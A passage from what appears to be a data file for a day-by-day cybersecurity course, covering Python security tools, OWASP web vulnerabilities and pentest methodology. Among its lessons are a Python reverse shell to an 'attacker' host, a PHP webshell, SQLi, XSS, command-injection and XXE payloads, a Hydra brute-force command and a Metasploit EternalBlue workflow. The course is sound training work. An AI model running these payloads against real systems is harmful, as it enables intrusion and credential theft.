    resources: ["https://docs.python.org/3/library/socket.html"],
    estimatedMinutes: 75,
  },
  {
    id: 31, day: 31, title: "Scapy — Packet Crafting", category: "Python", categoryColor: "#3A86FF",
    theory: "Scapy is a powerful Python library for packet manipulation, network scanning, and custom protocol implementation.\n\nBasic Scapy:\n---\nfrom scapy.all import *\n# Ping\npacket = IP(dst=\"8.8.8.8\")/ICMP()\nresponse = sr1(packet)\n# TCP SYN\npacket = IP(dst=\"target\")/TCP(dport=80, flags=\"S\")\nresponse = sr1(packet)\n---\n\nCapturing Packets:\n---\nsniff(iface=\"eth0\", prn=lambda x: x.summary(), count=10)\n---\n\nUse Cases:\n- SYN scanner\n- ARP spoofer\n- DNS query tool\n- Custom protocol testing\n- Network fuzzing",
    tasks: ["Use Scapy to send a custom ICMP ping and analyze the response", "Build a SYN scanner with Scapy", "Write an ARP scanner to discover hosts on local network", "Lab: Implement ARP spoofing with Scapy (on your own lab only)"],
    resources: ["https://scapy.readthedocs.io/"],
    estimatedMinutes: 70,
  },
  {
    id: 32, day: 32, title: "Python Web Scraping & OSINT", category: "Python", categoryColor: "#3A86FF",
    theory: "Python is excellent for OSINT (Open Source Intelligence) automation.\n\nKey Libraries:\n- requests: HTTP requests\n- BeautifulSoup4: HTML parsing\n- selenium: Browser automation\n- shodan: Shodan API wrapper\n\nOSINT Use Cases:\n- Email harvesting from websites\n- Subdomain enumeration\n- Social media profiling\n- Metadata extraction from documents\n\nRequests + BeautifulSoup:\n---\nimport requests\nfrom bs4 import BeautifulSoup\nresponse = requests.get(\"https://example.com\")\nsoup = BeautifulSoup(response.text, 'html.parser')\nlinks = [a.href for a in soup.find_all('a', href=True)]\n---\n\nShodan API — search for exposed services",
    tasks: ["Write a script to extract all email addresses from a website", "Use the Shodan API to search for exposed RDP servers (use free tier)", "Build a subdomain finder using DNS brute-forcing", "Lab: Create a tool to check if an email is in haveibeenpwned"],
    resources: ["https://shodan.io/", "https://haveibeenpwned.com/API/v3"],
    estimatedMinutes: 65,
  },
  {
    id: 33, day: 33, title: "Password Cracking with Python", category: "Python", categoryColor: "#3A86FF",
    theory: "Understanding password security requires knowing how hashing and cracking work.\n\nPython Hashing:\n---\nimport hashlib\nhash = hashlib.md5(b\"password\").hexdigest()\nsha256 = hashlib.sha256(b\"password\").hexdigest()\n---\n\nCracking Techniques:\n- Dictionary attack: Try wordlist\n- Brute force: Try all combinations\n- Rainbow table: Precomputed hashes\n- Rule-based: Apply mangling rules\n\nPython Dictionary Attack:\n---\nwith open('rockyou.txt', 'r', errors='ignore') as f:\n    for word in f:\n        if hashlib.md5(word.strip().encode()).hexdigest() == target:\n            print(f\"Found: {word}\")\n            break\n---\n\nTools: hashcat (GPU), John the Ripper, CrackStation",
    tasks: ["Write a Python MD5 dictionary attack using rockyou.txt", "Crack the MD5 hash: 5f4dcc3b5aa765d61d8327deb882cf99", "Research: What makes bcrypt/Argon2 resistant to cracking?", "Lab: Use hashcat to crack NTLM hashes from a test dump"],
    resources: ["https://hashcat.net/hashcat/", "https://www.openwall.com/john/"],
    estimatedMinutes: 65,
  },
  {
    id: 34, day: 34, title: "Web Automation & Testing", category: "Python", categoryColor: "#3A86FF",
    theory: "Python can automate web security testing. This includes directory brute-forcing, parameter fuzzing, and vulnerability scanning.\n\nKey Tools/Libraries:\n- requests: HTTP testing\n- urllib3: Low-level HTTP\n- selenium: Browser automation\n\nDirectory Brute Force:\n---\nimport requests\nwith open('wordlist.txt') as f:\n    for word in f:\n        url = f\"http://target/{word.strip()}\"\n        r = requests.get(url)\n        if r.status_code == 200:\n            print(f\"Found: {url}\")\n---\n\nParameter Fuzzing: Test for SQL injection, XSS\nBrute Force Login: Test default credentials\n\nImportant: Only test systems you own or have permission to test!",
    tasks: ["Build a directory brute-forcer using requests and a wordlist", "Write a script to test for SQL injection by checking error responses", "Create a form brute-forcer to test common passwords (on your lab)", "Lab: Use your script on DVWA (Damn Vulnerable Web Application)"],
    resources: ["https://github.com/digininja/DVWA", "https://github.com/danielmiessler/SecLists"],
    estimatedMinutes: 70,
  },
  {
    id: 35, day: 35, title: "Cryptography with Python", category: "Python", categoryColor: "#3A86FF",
    theory: "Cryptography is foundational to security. Python's cryptography library makes it accessible.\n\nSymmetric Encryption (AES):\n---\nfrom cryptography.fernet import Fernet\nkey = Fernet.generate_key()\nf = Fernet(key)\ntoken = f.encrypt(b\"secret message\")\ndecrypted = f.decrypt(token)\n---\n\nAsymmetric Encryption (RSA):\n- Public key: Encrypt / Verify signature\n- Private key: Decrypt / Create signature\n\nHashing: MD5 (broken), SHA-1 (deprecated), SHA-256/SHA-3 (secure)\n\nKey Concepts:\n- Confidentiality: Encryption\n- Integrity: HMAC, digital signatures\n- Non-repudiation: Digital signatures\n- Perfect Forward Secrecy: New keys per session",
    tasks: ["Encrypt and decrypt a file using Fernet (AES-128)", "Generate an RSA key pair and encrypt a message", "Implement HMAC message authentication in Python", "Research: What makes RSA-1024 insecure today?"],
    resources: ["https://cryptography.io/en/latest/"],
    estimatedMinutes: 65,
  },
  {
    id: 36, day: 36, title: "Building Security Tools", category: "Python", categoryColor: "#3A86FF",
    theory: "Combine your Python skills to build real security tools. Professional security tools follow software engineering principles.\n\nTool Architecture:\n- CLI interface (argparse)\n- Modular design (separate files for functionality)\n- Error handling and logging\n- Output formatting (JSON, CSV, table)\n- Configuration management\n\nBuilding a Reconnaissance Tool:\n1. DNS enumeration module\n2. Port scanner module\n3. Banner grabbing module\n4. Report generation\n\nProject Ideas:\n- Automated vulnerability scanner\n- Log parser and alerter\n- Password strength checker\n- Network device fingerprinter\n- File integrity monitor (like tripwire)",
    tasks: ["Build a full recon tool with argparse CLI and multiple modules", "Add JSON output and logging to your port scanner", "Create a file integrity monitor using hash comparison", "Lab: Publish your tool on GitHub with documentation"],
    resources: ["https://docs.python.org/3/library/argparse.html"],
    estimatedMinutes: 90,
  },
  {
    id: 37, day: 37, title: "Malware Analysis with Python", category: "Python", categoryColor: "#3A86FF",
    theory: "Python is used to analyze malware samples — extracting indicators of compromise (IOCs) and understanding behavior.\n\nStatic Analysis:\n- Extract strings: strings malware.exe\n- Disassemble: pydisasm, ida pro\n- Parse PE headers: pefile library\n\nPython pefile:\n---\nimport pefile\npe = pefile.PE(\"sample.exe\")\nprint(pe.OPTIONAL_HEADER)\nfor entry in pe.DIRECTORY_ENTRY_IMPORT:\n    print(entry.dll.decode())\n    for imp in entry.imports:\n        print('  ', imp.name)\n---\n\nIOC Extraction:\n- IP addresses and URLs in strings\n- File hashes (MD5, SHA256)\n- Registry keys\n- Mutexes and file artifacts",
    tasks: ["Install pefile and analyze a benign PE file (notepad.exe)", "Write a script to extract all strings from a binary", "Research: What are the most common malware persistence mechanisms?", "Lab: Analyze a malware sample on VirusTotal and extract IOCs"],
    resources: ["https://github.com/erocarrera/pefile", "https://www.virustotal.com/"],
    estimatedMinutes: 70,
  },
  {
    id: 38, day: 38, title: "Python for Red Team", category: "Python", categoryColor: "#3A86FF",
    theory: "Red team operations use Python to create offensive tools. Understanding these is essential for defenders too.\n\nCommon Red Team Python Techniques:\n- Reverse shells: Connect back to attacker\n- Bind shells: Listen on victim\n- Shellcode runners: Execute shellcode in Python\n- C2 (Command & Control): Python-based frameworks\n\nReverse Shell:\n---\nimport socket, subprocess, os\ns = socket.socket()\ns.connect((\"attacker\", 4444))\nos.dup2(s.fileno(), 0)\nos.dup2(s.fileno(), 1)\nos.dup2(s.fileno(), 2)\nsubprocess.call([\"/bin/sh\", \"-i\"])\n---\n\nNOTE: Only use on systems you own or have explicit written permission to test.\n\nDefense: Monitor for unusual outbound connections, process anomalies",
    tasks: ["Study the reverse shell code and understand each line", "Research how EDR solutions detect Python-based attacks", "Lab: Test a Python reverse shell between two VMs you control", "Implement a basic C2 with HTTP polling (for learning only, in isolated lab)"],
    resources: ["https://github.com/swisskyrepo/PayloadsAllTheThings"],
    estimatedMinutes: 80,
  },
  {
    id: 39, day: 39, title: "Python Forensics Tools", category: "Python", categoryColor: "#3A86FF",
    theory: "Python enables building custom forensics tools for incident response and digital investigations.\n\nVolatility Plugins (Python):\n- volatility3 uses Python plugins\n- Write custom plugins to extract specific artifacts\n\nMetal Analysis:\n- exifread — Extract metadata from images\n- python-docx — Parse Word documents\n- PyPDF2 — Parse PDF files\n\nTimeline Creation:\n---\nimport os, datetime\nfor root, dirs, files in os.walk('/path'):\n    for f in files:\n        fp = os.path.join(root, f)\n        mtime = os.path.getmtime(fp)\n        print(datetime.datetime.fromtimestamp(mtime), fp)\n---\n\nDisk Image Analysis: pytsk3, libewf",
    tasks: ["Extract EXIF data from photos using exifread or Pillow", "Write a script to create a file timeline sorted by modification time", "Parse metadata from a PDF to find author and creation date", "Lab: Write a simple log correlation script for incident investigation"],
    resources: ["https://github.com/erocarrera/pefile"],
    estimatedMinutes: 65,
  },
  {
    id: 40, day: 40, title: "API Security Testing", category: "Python", categoryColor: "#3A86FF",
    theory: "Modern applications use APIs. Testing API security is now a core pentest skill.\n\nAPI Security Issues (OWASP API Top 10):\n1. Broken Object Level Authorization (BOLA)\n2. Broken Authentication\n3. Excessive Data Exposure\n4. Lack of Rate Limiting\n5. Broken Function Level Authorization\n6. Mass Assignment\n7. Security Misconfiguration\n8. Injection\n9. Improper Asset Management\n10. Insufficient Logging\n\nPython for API Testing:\n---\nimport requests\nr = requests.get(\"https://api.target.com/users/1\",\n    headers={\"Authorization\": \"Bearer token\"})\nprint(r.json())\n# Try BOLA: change user ID\nr2 = requests.get(\"https://api.target.com/users/2\", ...)\n---",
    tasks: ["Set up DVWS (Damn Vulnerable Web Services) locally", "Find a BOLA vulnerability in a test API", "Use Python requests to automate API testing for 10 endpoints", "Lab: Use Postman + Python to test an API for OWASP API Top 10 issues"],
    resources: ["https://owasp.org/www-project-api-security/", "https://github.com/nicowillis/dvws-node"],
    estimatedMinutes: 70,
  },
  {
    id: 41, day: 41, title: "Threat Intelligence Automation", category: "Python", categoryColor: "#3A86FF",
    theory: "Threat intelligence involves collecting, processing, and analyzing data about threats. Python excels at automation.\n\nThreat Intel Sources:\n- AbuseIPDB: Malicious IP database\n- VirusTotal API: File/URL/IP reputation\n- OTX AlienVault: Threat sharing platform\n- MISP: Malware Information Sharing Platform\n- Shodan: Internet-wide scanning\n\nAutomation Use Cases:\n- Auto-lookup IOCs against multiple feeds\n- Block malicious IPs in firewall via API\n- Enrich SIEM alerts with threat context\n- Generate threat reports\n\n---\nimport requests\nVT_API = \"your_key\"\nr = requests.get(f\"https://www.virustotal.com/api/v3/ip_addresses/8.8.8.8\",\n    headers={\"x-apikey\": VT_API})\nprint(r.json()['data']['attributes']['last_analysis_stats'])\n---",
    tasks: ["Create a free VirusTotal account and use the API to check file hashes", "Build a script that checks IPs against AbuseIPDB", "Write a tool that takes a list of IOCs and checks all at once", "Lab: Set up MISP in a VM and share indicators"],
    resources: ["https://developers.virustotal.com/", "https://www.abuseipdb.com/api.html"],
    estimatedMinutes: 65,
  },
  {
    id: 42, day: 42, title: "Python Module Review & Project", category: "Python", categoryColor: "#3A86FF",
    theory: "Excellent work completing the Python for Security module!\n\nYou've learned:\n✓ Python fundamentals for security\n✓ Network programming with sockets\n✓ Packet crafting with Scapy\n✓ OSINT automation\n✓ Password cracking concepts\n✓ Web security testing\n✓ Cryptography\n✓ Building security tools\n✓ Malware analysis\n✓ Red team techniques\n✓ Forensics tools\n✓ API security testing\n✓ Threat intelligence\n\nProject: Build a comprehensive security toolkit with at least 3 modules",
    tasks: ["Complete a Python CTF challenge (PicoCTF has great ones)", "Publish your security toolkit to GitHub", "Write documentation for all your tools", "Contribute to an open-source security project"],
    resources: ["https://picoctf.org/", "https://github.com/"],
    estimatedMinutes: 120,
  },

  // === WEB SECURITY ===
  {
    id: 43, day: 43, title: "Web Security Fundamentals", category: "Web Security", categoryColor: "#FF006E",
    theory: "Web security is one of the most critical areas as most applications are web-based.\n\nCore Concepts:\n- Same-Origin Policy (SOP): Browsers restrict cross-origin requests\n- Content Security Policy (CSP): Controls resource loading\n- CORS: Controlled cross-origin resource sharing\n- Cookies: HttpOnly, Secure, SameSite attributes\n\nWeb Security Tools:\n- Burp Suite: Industry standard proxy\n- OWASP ZAP: Free alternative\n- nikto: Web server scanner\n- dirb/gobuster: Directory brute-forcers\n\nHTTP Security Headers:\n- X-Frame-Options: Clickjacking protection\n- X-XSS-Protection (deprecated, use CSP)\n- Strict-Transport-Security: Force HTTPS\n- X-Content-Type-Options: Prevent MIME sniffing",
    tasks: ["Set up Burp Suite Community and intercept a request", "Scan a target with nikto -h http://testphp.vulnweb.com", "Check HTTP security headers: curl -I https://example.com", "Lab: Set up DVWA and explore all vulnerability categories"],
    resources: ["https://portswigger.net/burp", "https://owasp.org/www-project-top-ten/"],
    estimatedMinutes: 60,
  },
  {
    id: 44, day: 44, title: "SQL Injection (SQLi)", category: "Web Security", categoryColor: "#FF006E",
    theory: "SQL Injection is the #1 web vulnerability — an attacker injects malicious SQL into queries.\n\nTypes:\n- Classic/Error-based: Error messages reveal data\n- Blind Boolean: TRUE/FALSE responses\n- Blind Time-based: Time delays as signal\n- Union-based: Append SELECT to get extra data\n- Out-of-band: DNS/HTTP exfiltration\n\nBasic Payload:\n' OR '1'='1 — Always true\n' OR 1=1 -- — Comment out rest\n' UNION SELECT username,password FROM users --\n\nWhy it works: User input directly concatenated into SQL query.\n\nPrevention:\n- Prepared statements / parameterized queries\n- Input validation\n- WAF\n- Least privilege database accounts",
    tasks: ["Test for SQLi in DVWA (low security level)", "Use sqlmap to automate SQLi testing: sqlmap -u 'http://dvwa/login.php' --forms", "Extract database contents using UNION injection manually", "Lab: Write a secure login in PHP/Python using prepared statements"],
    resources: ["https://sqlmap.org/", "https://portswigger.net/web-security/sql-injection"],
    estimatedMinutes: 80,
  },
  {
    id: 45, day: 45, title: "Cross-Site Scripting (XSS)", category: "Web Security", categoryColor: "#FF006E",
    theory: "XSS allows attackers to inject malicious JavaScript into web pages viewed by other users.\n\nTypes:\n- Reflected: Payload in URL/response, not stored\n- Stored (Persistent): Payload saved in database\n- DOM-based: Payload processed by client-side JS\n\nImpact:\n- Session hijacking (steal cookies)\n- Keylogging\n- Phishing overlay\n- Cryptocurrency mining\n- Redirects\n\nBasic Payloads:\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(document.cookie)>\n\nPrevention:\n- Output encoding/escaping\n- Content Security Policy\n- HttpOnly cookies (prevents JS access)\n- Input validation",
    tasks: ["Find and exploit XSS in DVWA (all 3 types)", "Steal session cookies using XSS (in controlled lab)", "Write a CSP header that prevents XSS execution", "Lab: Use Burp's XSS scanner and analyze results"],
    resources: ["https://portswigger.net/web-security/cross-site-scripting"],
    estimatedMinutes: 75,
  },
  {
    id: 46, day: 46, title: "Authentication & Authorization Flaws", category: "Web Security", categoryColor: "#FF006E",
    theory: "Authentication and authorization weaknesses are among the most dangerous vulnerabilities.\n\nAuthentication Issues:\n- Default credentials (admin/admin)\n- Weak passwords\n- No account lockout (brute force)\n- Broken \"remember me\" functions\n- Insecure password reset\n\nAuthorization Issues:\n- IDOR (Insecure Direct Object Reference): /user/123 → /user/124\n- Privilege escalation: User → Admin\n- Missing function-level access control\n- Forced browsing: Guess URLs\n\nBrute Force Tools:\n- Hydra: hydra -l admin -P rockyou.txt target http-post-form\n- Burp Suite Intruder\n\nPrevention:\n- MFA (Multi-Factor Authentication)\n- Account lockout policies\n- Rate limiting\n- JWT properly implemented\n- Server-side authorization checks",
    tasks: ["Exploit IDOR vulnerability in a lab environment (DVWA or WebGoat)", "Use Hydra to brute force a login form (on DVWA only)", "Research JWT vulnerabilities: alg:none, weak secrets", "Lab: Implement proper authorization checks in a sample application"],
    resources: ["https://portswigger.net/web-security/authentication", "https://github.com/WebGoat/WebGoat"],
    estimatedMinutes: 70,
  },
  {
    id: 47, day: 47, title: "CSRF & Session Management", category: "Web Security", categoryColor: "#FF006E",
    theory: "CSRF (Cross-Site Request Forgery) tricks authenticated users into making unintended requests.\n\nHow CSRF Works:\n1. User is logged into bank.com\n2. User visits evil.com\n3. Evil.com sends request to bank.com on user's behalf\n4. Bank.com sees valid session cookie and executes\n\nCSRF Attack Example:\n<img src=\"https://bank.com/transfer?to=hacker&amount=1000\">\n\nPrevention:\n- CSRF tokens (synchronizer token pattern)\n- SameSite cookie attribute\n- Verifying Origin header\n- Double submit cookie\n\nSession Management Flaws:\n- Session fixation\n- Session prediction (weak session IDs)\n- Insecure transmission (HTTP)\n- Long session timeouts\n- Not invalidating on logout",
    tasks: ["Exploit CSRF in DVWA (low security)", "Test for missing CSRF tokens in a form using Burp", "Implement CSRF protection in a simple web form", "Lab: Set up and test session fixation attack scenarios"],
    resources: ["https://portswigger.net/web-security/csrf"],
    estimatedMinutes: 65,
  },
  {
    id: 48, day: 48, title: "File Upload Vulnerabilities", category: "Web Security", categoryColor: "#FF006E",
    theory: "File upload features are one of the most dangerous features if not properly secured.\n\nAttack Scenarios:\n- Upload PHP webshell disguised as image\n- Bypass extension filters: .php5, .phtml, .php.jpg\n- MIME type confusion: Change Content-Type header\n- Double extension: shell.php.jpg\n- Null byte injection: shell.php%00.jpg (old systems)\n\nWebshell:\n<?php system($_GET['cmd']); ?>\n\nAccess: http://target/uploads/shell.php?cmd=id\n\nPrevention:\n- Validate file type by content (magic bytes), not extension\n- Rename uploaded files\n- Store outside webroot\n- Run antivirus on uploads\n- Disable script execution in upload directory\n- Use separate domain for user content",
    tasks: ["Exploit file upload vulnerability in DVWA (all security levels)", "Bypass extension filters using various techniques", "Upload a PHP webshell and execute commands", "Lab: Fix the vulnerable upload code in DVWA"],
    resources: ["https://portswigger.net/web-security/file-upload"],
    estimatedMinutes: 70,
  },
  {
    id: 49, day: 49, title: "Command Injection & Path Traversal", category: "Web Security", categoryColor: "#FF006E",
    theory: "Command injection and path traversal are critical server-side vulnerabilities.\n\nCommand Injection:\nWhen user input is passed to a system command without sanitization.\n\nVulnerable code (PHP):\n$output = shell_exec(\"ping \" . $_GET['host']);\n\nAttack: ?host=8.8.8.8; cat /etc/passwd\n\nPayloads:\n- ; id — Command separator\n- | id — Pipe\n- && id — AND (runs if first succeeds)\n- || id — OR (runs if first fails)\n- $(id) — Command substitution (backtick variant)\n\nPath Traversal:\n?file=../../etc/passwd\n\nPrevention:\n- Never use user input in system commands\n- Use allowlists for file paths\n- chroot jails\n- Input validation",
    tasks: ["Exploit command injection in DVWA", "Try path traversal on vulnerable apps: ../../etc/passwd", "Test for blind command injection (sleep, ping)", "Lab: Fix command injection by using parameterized system calls"],
    resources: ["https://portswigger.net/web-security/os-command-injection"],
    estimatedMinutes: 65,
  },
  {
    id: 50, day: 50, title: "SSRF & XXE", category: "Web Security", categoryColor: "#FF006E",
    theory: "SSRF and XXE are modern web vulnerabilities common in cloud environments.\n\nSSRF (Server-Side Request Forgery):\nAttacker makes server fetch URLs they control.\n\nAttack: ?url=http://169.254.169.254/metadata (AWS metadata)\n\nImpact:\n- Access internal services\n- Cloud metadata exposure\n- Port scanning internal network\n- Read internal files\n\nXXE (XML External Entity):\nMalicious XML references external entities.\n\n---\n<?xml version=\"1.0\"?>\n<!DOCTYPE foo [\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<data>&xxe;</data>\n---\n\nPrevention:\n- SSRF: Allowlist URLs, block internal ranges\n- XXE: Disable external entity processing",
    tasks: ["Test for SSRF using Burp's Collaborator", "Find XXE in a vulnerable application (WebGoat has good labs)", "Test SSRF against an AWS-like metadata service in your lab", "Research: How did SSRF lead to the Capital One breach?"],
    resources: ["https://portswigger.net/web-security/ssrf", "https://portswigger.net/web-security/xxe"],
    estimatedMinutes: 70,
  },
  {
    id: 51, day: 51, title: "Broken Access Control", category: "Web Security", categoryColor: "#FF006E",
    theory: "Broken Access Control is #1 in OWASP Top 10 2021. It covers a wide range of authorization failures.\n\nVulnerability Types:\n- IDOR: Access others' resources by changing IDs\n- Missing Authorization: No checks on sensitive functions\n- Directory Listing: Web server exposes file listing\n- Forced Browsing: Access admin pages directly\n- JWT Attacks: Weak tokens or alg:none\n- OAuth Flaws: Redirect URI manipulation\n\nTesting:\n1. Create two accounts\n2. Perform actions as Account A\n3. Try to access Account A's resources as Account B\n4. Check if admin functions work for regular users\n\nPrevention:\n- Deny by default\n- Server-side authorization checks\n- Avoid exposing IDs in URLs (use UUIDs)\n- Regular access control testing",
    tasks: ["Find 3 IDOR vulnerabilities in a vulnerable lab (PortSwigger Academy)", "Test horizontal and vertical privilege escalation", "Research a real-world IDOR breach (Facebook, Instagram cases)", "Lab: Complete PortSwigger's Access Control labs"],
    resources: ["https://portswigger.net/web-security/access-control"],
    estimatedMinutes: 75,
  },
  {
    id: 52, day: 52, title: "Security Misconfigurations", category: "Web Security", categoryColor: "#FF006E",
    theory: "Security misconfiguration is #5 in OWASP Top 10. It's often the easiest vulnerability to find.\n\nCommon Misconfigurations:\n- Default credentials (admin/admin, admin/password)\n- Unnecessary features enabled\n- Error messages exposing stack traces\n- Directory listing enabled\n- Outdated software\n- Missing security headers\n- Exposed admin interfaces (phpMyAdmin, etc.)\n- Cloud storage publicly accessible (S3 buckets)\n- Debug mode enabled in production\n\nTesting:\n- nikto -h target\n- whatweb target\n- Check robots.txt, .git directory, backup files\n- Try /admin, /phpmyadmin, /.env, /backup.zip\n\nCloud Misconfigurations: AWS S3, GCP, Azure exposed buckets",
    tasks: ["Run nikto and whatweb against a test target", "Check a website for exposed sensitive files (.env, .git, backup)", "Search for public S3 buckets using bucketkicker or similar", "Lab: Find 5 misconfigurations in DVWA"],
    resources: ["https://github.com/urbanadventurer/WhatWeb", "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"],
    estimatedMinutes: 60,
  },
  {
    id: 53, day: 53, title: "Cryptographic Failures", category: "Web Security", categoryColor: "#FF006E",
    theory: "Cryptographic failures (formerly 'Sensitive Data Exposure') involve weak or missing encryption.\n\nCommon Failures:\n- Using HTTP instead of HTTPS\n- Weak encryption algorithms (MD5, SHA1 for passwords)\n- Hardcoded cryptographic keys\n- Not encrypting sensitive data at rest\n- Weak TLS configuration (TLS 1.0/1.1, weak ciphers)\n- Predictable random number generation\n\nTesting TLS:\n- testssl.sh target:443 — Comprehensive TLS tester\n- SSLyze: Python TLS analyzer\n- SSL Labs: Online test\n\nPassword Storage:\n- Bad: MD5(password), SHA1(password)\n- Better: bcrypt, Argon2, scrypt, PBKDF2\n\nData at Rest: Encrypt sensitive database fields, disk encryption",
    tasks: ["Test SSL/TLS configuration: testssl.sh your-site.com", "Check SSL Labs rating for a website: ssllabs.com/ssltest", "Verify if a site accepts TLS 1.0/1.1 (outdated)", "Lab: Compare MD5 vs bcrypt performance (why bcrypt is better)"],
    resources: ["https://testssl.sh/", "https://www.ssllabs.com/ssltest/"],
    estimatedMinutes: 60,
  },
  {
    id: 54, day: 54, title: "Vulnerable & Outdated Components", category: "Web Security", categoryColor: "#FF006E",
    theory: "Using components with known vulnerabilities is #6 in OWASP Top 10.\n\nRisk Areas:\n- Outdated libraries (Log4Shell was in log4j)\n- Abandoned software with known CVEs\n- Unpatched CMS (WordPress plugins/themes)\n- Outdated Docker images\n\nFinding Vulnerabilities:\n- retire.js — Checks JS libraries\n- OWASP Dependency Check — Java/JavaScript\n- Snyk — Multi-language SCA\n- npm audit / pip audit — Package managers\n- Trivy — Container scanning\n\nCVE Research:\n- CVE database: cve.mitre.org\n- NVD: nvd.nist.gov\n- Exploit-DB: exploit-db.com\n- Vulhub: Docker-based vulnerable environments",
    tasks: ["Run npm audit on a Node.js project", "Find 3 CVEs for a specific version of Apache in the NVD", "Search Exploit-DB for a CVE and understand the exploit", "Lab: Use Vulhub to set up and exploit a real CVE"],
    resources: ["https://vulhub.org/", "https://exploit-db.com/", "https://nvd.nist.gov/"],
    estimatedMinutes: 65,
  },
  {
    id: 55, day: 55, title: "Logging & Monitoring Failures", category: "Web Security", categoryColor: "#FF006E",
    theory: "Insufficient logging and monitoring allows attackers to operate undetected.\n\nWhat to Log:\n- Authentication events (success AND failures)\n- Authorization failures\n- Input validation failures\n- Application errors\n- API calls with sensitive operations\n\nWhat NOT to Log:\n- Passwords (even failed ones)\n- Credit card numbers\n- Personal data\n- Session tokens\n\nSIEM Integration:\n- Send logs to centralized SIEM\n- Create alerts for suspicious patterns\n- Multiple failed logins = alert\n- Off-hours admin activity = alert\n\nIncident Detection KPIs:\n- MTTD: Mean Time to Detect\n- MTTR: Mean Time to Respond\n\nThe Verizon DBIR found 56% of breaches took months to discover!",
    tasks: ["Set up logging for a web application (access, error, security logs)", "Create a Splunk or ELK alert for 5+ failed logins in 1 minute", "Review Apache/Nginx access logs and identify suspicious requests", "Lab: Simulate an attack and verify your logging captured it"],
    resources: ["https://owasp.org/www-project-web-security-testing-guide/"],
    estimatedMinutes: 60,
  },
  {
    id: 56, day: 56, title: "Web Security Review & Bug Bounty Intro", category: "Web Security", categoryColor: "#FF006E",
    theory: "You've completed the Web Security module! Summary:\n\n✓ Web security fundamentals\n✓ SQL Injection\n✓ Cross-Site Scripting\n✓ Authentication/Authorization flaws\n✓ CSRF and Session Management\n✓ File Upload vulnerabilities\n✓ Command Injection & Path Traversal\n✓ SSRF & XXE\n✓ Broken Access Control\n✓ Security Misconfigurations\n✓ Cryptographic Failures\n✓ Vulnerable Components\n✓ Logging failures\n\nBug Bounty Programs:\n- HackerOne: hackerone.com\n- Bugcrowd: bugcrowd.com\n- Intigriti: intigriti.com\n- Start with public programs, read scope carefully!",
    tasks: ["Complete OWASP WebGoat — all lessons", "Create an account on HackerOne and explore programs", "Read a bug bounty report (HackerOne Hacktivity is public)", "Lab: Complete PortSwigger Web Security Academy free labs"],
    resources: ["https://portswigger.net/web-security", "https://www.hackerone.com/"],
    estimatedMinutes: 90,
  },

  // === PENTESTING ===
  {
    id: 57, day: 57, title: "Penetration Testing Methodology", category: "PenTesting", categoryColor: "#FB5607",
    theory: "Penetration testing is a simulated cyberattack to identify vulnerabilities before real attackers do.\n\nPentest Phases (PTES/OWASP):\n1. Pre-engagement: Scope, rules, contracts, NDA\n2. Reconnaissance: Information gathering (passive/active)\n3. Scanning & Enumeration: Live hosts, ports, services\n4. Vulnerability Analysis: Identify weaknesses\n5. Exploitation: Attempt to breach systems\n6. Post-Exploitation: Persistence, lateral movement, data access\n7. Reporting: Document findings, severity, remediation\n\nTypes of Pentests:\n- Black Box: No prior knowledge\n- White Box: Full knowledge\n- Gray Box: Limited knowledge\n\nCritical: ALWAYS have written authorization. Unauthorized testing is illegal.",
    tasks: ["Write a sample Rules of Engagement document for a pentest", "Research the difference between pentest, vulnerability assessment, and red team", "Sign up for HackTheBox or TryHackMe and complete a beginner path", "Research: What is a CVSSv3 score and how is it calculated?"],
    resources: ["https://www.hackthebox.com/", "https://tryhackme.com/", "http://www.pentest-standard.org/"],
    estimatedMinutes: 60,
  },
  {
    id: 58, day: 58, title: "Passive Reconnaissance", category: "PenTesting", categoryColor: "#FB5607",
    theory: "Passive recon gathers information without directly interacting with the target.\n\nSources:\n- WHOIS: Domain registration info\n- DNS records: Subdomains, mail servers\n- Shodan: Internet-connected devices\n- Censys: Similar to Shodan\n- Google Dorking: Advanced search operators\n- LinkedIn: Employee names, tech stack\n- GitHub: Leaked credentials, code\n- Wayback Machine: Historical website content\n\nGoogle Dorks:\n- site:target.com filetype:pdf\n- site:target.com inurl:admin\n- \"target.com\" filetype:sql\n\nTools:\n- theHarvester: Email, subdomain harvesting\n- Maltego: Visual link analysis\n- Recon-ng: Modular recon framework\n- OSINT Framework: osintframework.com",
    tasks: ["Use theHarvester to gather info on a target domain (with permission)", "Find employee information on LinkedIn for a company", "Use Google dorks to find exposed documents", "Lab: Search GitHub for accidentally committed credentials for a company"],
    resources: ["https://osintframework.com/", "https://github.com/laramies/theHarvester"],
    estimatedMinutes: 65,
  },
  {
    id: 59, day: 59, title: "Active Reconnaissance", category: "PenTesting", categoryColor: "#FB5607",
    theory: "Active recon involves directly interacting with the target to gather information.\n\nPort Scanning:\n- nmap -sV -O -A target — Full scan\n- masscan --rate 10000 -p 0-65535 target — Fast scanner\n\nService Enumeration:\n- Banner grabbing: nc target 80\n- HTTP: curl -v, whatweb, nikto\n- SMB: enum4linux, smbclient\n- LDAP: ldapsearch\n- SNMP: snmpwalk\n\nSubdomain Enumeration:\n- gobuster dns -d target.com -w wordlist.txt\n- amass enum -d target.com\n- subfinder -d target.com\n\nWeb Directory Enumeration:\n- gobuster dir -u http://target -w /usr/share/wordlists/dirb/big.txt\n- feroxbuster -u http://target\n- ffuf -u http://target/FUZZ -w wordlist.txt",
    tasks: ["Perform a full nmap scan on a practice target (HackTheBox machine)", "Enumerate web directories with gobuster on a vulnerable VM", "Enumerate SMB shares: enum4linux -a target", "Lab: Subdomain enumerate a bug bounty target (check scope first)"],
    resources: ["https://github.com/ffuf/ffuf", "https://github.com/OJ/gobuster"],
    estimatedMinutes: 75,
  },
  {
    id: 60, day: 60, title: "Metasploit Framework", category: "PenTesting", categoryColor: "#FB5607",
    theory: "Metasploit is the world's most used penetration testing framework.\n\nComponents:\n- msfconsole: Main interface\n- Exploits: Attack modules\n- Payloads: Code executed after exploitation\n- Auxiliary: Scanners, fuzzers, tools\n- Post: Post-exploitation modules\n\nBasic Workflow:\n---\nmsf> search eternalblue\nmsf> use exploit/windows/smb/ms17_010_eternalblue\nmsf> set RHOSTS 192.168.1.100\nmsf> set PAYLOAD windows/x64/meterpreter/reverse_tcp\nmsf> set LHOST 192.168.1.1\nmsf> run\n---\n\nMeterpreter Commands:\n- sysinfo, getuid, getsystem\n- shell, upload, download\n- hashdump, screenshare\n- migrate (process injection)\n- run post/multi/recon/local_exploit_suggester",
